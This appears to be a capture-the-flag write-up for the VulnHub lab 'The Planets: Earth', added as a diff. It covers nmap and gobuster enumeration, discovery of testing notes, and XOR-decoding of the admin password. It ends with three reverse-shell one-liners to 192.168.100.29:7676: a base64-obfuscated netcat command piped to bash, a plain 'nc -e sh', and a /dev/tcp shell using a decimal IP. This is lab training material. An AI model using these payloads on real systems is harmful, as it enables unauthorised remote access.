@@ -1,0 +1,240 @@
+THE PLANETS: EARTH
+
+
+ENUMERATION 
+
+"""
+
+
+
+
+┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/EARTH]
+└─$ sudo nmap -p- -sC -sV -A  --min-rate 2500 192.168.100.32 -oN nmap.txt 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-07 12:38 EST
+Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 67.71% done; ETC: 12:39 (0:00:17 remaining)
+Nmap scan report for 192.168.100.32
+Host is up (0.00065s latency).
+Not shown: 65474 filtered tcp ports (no-response), 58 filtered tcp ports (admin-prohibited)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
+| ssh-hostkey: 
+|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)
+|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
+|_http-title: Bad Request (400)
+|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
+|_http-title: Test Page for the HTTP Server on Fedora
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
+| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
+| Not valid before: 2021-10-12T23:26:31
+|_Not valid after:  2031-10-10T23:26:31
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+| tls-alpn: 
+|_  http/1.1
+MAC Address: 08:00:27:BC:30:77 (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.65 ms 192.168.100.32
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 71.47 seconds
+
+
+
+
+
+"""
+
+found 2 host names apply that in etc/hosts
+
+
+
+GOBUSTER 
+
+http://earth.local/
+""""
+
+
+
+
+
+┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/EARTH]
+└─$ gobuster dir -u http://earth.local/ -w /usr/share/wordlists/dirb/big.txt  -t 80 --no-error -x php,txt,jsp
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://earth.local/
+[+] Method:                  GET
+[+] Threads:                 80
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,txt,jsp
+[+] Timeout:                 10s
+===============================================================
+2022/03/07 12:48:28 Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 301) [Size: 0] [--> /admin/]
+/cgi-bin/             (Status: 403) [Size: 199]            
+                                                           
+===============================================================                                                                                                        
+2022/03/07 12:54:56 Finished                                                                                                                                           
+===============================================================                                                                                                        
+                                                                 
+
+                                                                                                                                                                       
+┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/EARTH]
+└─$ gobuster dir -u http://terratest.earth.local -w /usr/share/wordlists/dirb/big.txt  -t 80 --no-error 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://terratest.earth.local
+[+] Method:                  GET
+[+] Threads:                 80
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/03/07 12:57:36 Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 301) [Size: 0] [--> /admin/]
+/cgi-bin/             (Status: 403) [Size: 199]            
+                                                           
+===============================================================
+2022/03/07 12:58:59 Finished
+===============================================================
+                                                                  
+
+
+""""
+https://terratest.earth.local/robots.txt
+
+"""
+
+
+
+
+
+User-Agent: *
+Disallow: /*.asp
+Disallow: /*.aspx
+Disallow: /*.bat
+Disallow: /*.c
+Disallow: /*.cfm
+Disallow: /*.cgi
+Disallow: /*.com
+Disallow: /*.dll
+Disallow: /*.exe
+Disallow: /*.htm
+Disallow: /*.html
+Disallow: /*.inc
+Disallow: /*.jhtml
+Disallow: /*.jsa
+Disallow: /*.json
+Disallow: /*.jsp
+Disallow: /*.log
+Disallow: /*.mdb
+Disallow: /*.nsf
+Disallow: /*.php
+Disallow: /*.phtml
+Disallow: /*.pl
+Disallow: /*.reg
+Disallow: /*.sh
+Disallow: /*.shtml
+Disallow: /*.sql
+Disallow: /*.txt
+Disallow: /*.xml
+Disallow: /testingnotes.*
+
+
+
+
+
+"""
+
+
+
+https://terratest.earth.local/testingnotes.txt
+
+"""
+
+
+
+
+Testing secure messaging system notes:
+*Using XOR encryption as the algorithm, should be safe as used in RSA.
+*Earth has confirmed they have received our sent messages.
+*testdata.txt was used to test encryption.
+*terra used as username for admin portal.
+Todo:
+*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
+*Need to test different key lengths to protect against bruteforce. How long should the key be?
+*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
+
+
+
+"""
+
+testdata.txt
+
+"""
+
+
+
+┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/EARTH]
+└─$ curl https://terratest.earth.local/testdata.txt -k
+According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
+
+
+
+
+"""
+
+
+From the note, we can confirm that the encryption algorithm is XOR and the key might be from testdata.txt. Likewise, the username for the admin portal is terra. Also, the admin portal is /admin on the other website.
+
+testdata.txt
+┌──(kali㉿kali)-[~/vulnhub/earth]
+└─$ curl https://terratest.earth.local/testdata.txt -k    
+According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
+
+With this information, I opened CyberChef and searched for XOR. I put the above text in the key part of CyberChef with UTF-8 input. The following message gave me the possible password of the user terra.
+
+
+
+
+
+
+ADMIN
+
+"""
+CLI COMMAND LINE
+
+
+echo bmMgLWUgc2ggMTkyLjE2OC4xMDAuMjkgNzY3Ngo= | base64 -d | bash
+
+
+
+
+nc -e sh 192.168.100.29 7676
+
+
+sh -i >& /dev/tcp/3232261149/7676 0>&1
+
+
+"""
